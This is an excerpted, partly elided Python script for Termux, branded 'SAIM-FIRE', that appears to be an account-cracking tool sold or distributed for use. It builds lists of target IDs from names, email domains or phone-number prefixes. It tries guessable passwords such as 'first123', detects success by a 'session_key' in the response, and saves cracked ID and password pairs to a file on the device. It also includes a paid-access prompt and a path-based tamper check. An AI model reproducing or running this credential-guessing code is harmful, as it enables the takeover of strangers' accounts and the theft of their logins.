...
try:
        ...
        print('\033[1;32m Installing missing modules ...')
...
\t[×] Developed By SAIM ALI{EXTRA} (SAIM)
{WHITE}[•] AUTHOR       : SAIM PROGRAMER
{WHITE}[•] WhatsApp     :   COMING SOON
[•] FaceBook     :   SAIM ALI
[•] Version      :   {RED}TRAIL
{WHITE}[•] YouTube      :   SOON
...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+?text={bumper}")
                        qsbuy()
...
class crack_main():
        ...
        def crackmail(self,id):
                ...
                user=[]
                print(" [*] First Name \033[1;32mExample Hamza,Areesha")
                first = input(" First Name : ")
                last = input(" Last Name : ")
                print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")
                domain = input(" Domain : ")
                print("\n [?] Limit ids \033[1;32mExample 1000,5000,50000")
        ...
        def cracknum(self,id):
                global methods
                os.system('clear');print(logo);xchker()
                print('\033[0mFor \033[1;32mExample :\033[0m 92310,92342,92300,92301 ...')
                kode = input('\033[0mChoose Code : \033[0m')
                print('\033[0mFor \033[1;32mExample :\033[0m 2000,4000,6000 ...')
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r|SAIM-🔥| %s ✓ [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[SAIM-FIRE-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/SAIM-FIRE_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                if pl in ['auto','Auto','AUTO','auto or Auto']:
                        ...
                        print(' \033[1;32m\033[1;32mExample first123,last123,khan123,firstlast')
                        print(50*"-")
                ...
                print(' Ok Ids Save In : /sdcard/SAIM-FIRE_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
def new_file(cookies,access_token):
        ...
        for xd in range(fl):
                ...
                try:
                        ...
                        print(' No internet connection ....')
        print('\n\033[1;92m \033[1;32mExample: 100087,100088 etc\033[0;97m')
        try:
...
def sep():
        ...
        try:
                ...
                limit = 1
        print(f'{rg} File Path \033[1;32mExample /sdcard/xxx.txt{s}')
        file_name = input('\033[0m Input file path : ')
        print(f'{rg} Save As \033[1;32mExample /sdcard/newfile.txt{s}')
...
def double():
        ...
        try:
                ...
                print(' \n\033[1;97m\033[1;32mExample: /sdcard/xxx.txt\n\033[0;97m')
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/SAIM-FIRE' in datar:
        pass
else:
        for i in range(5000):
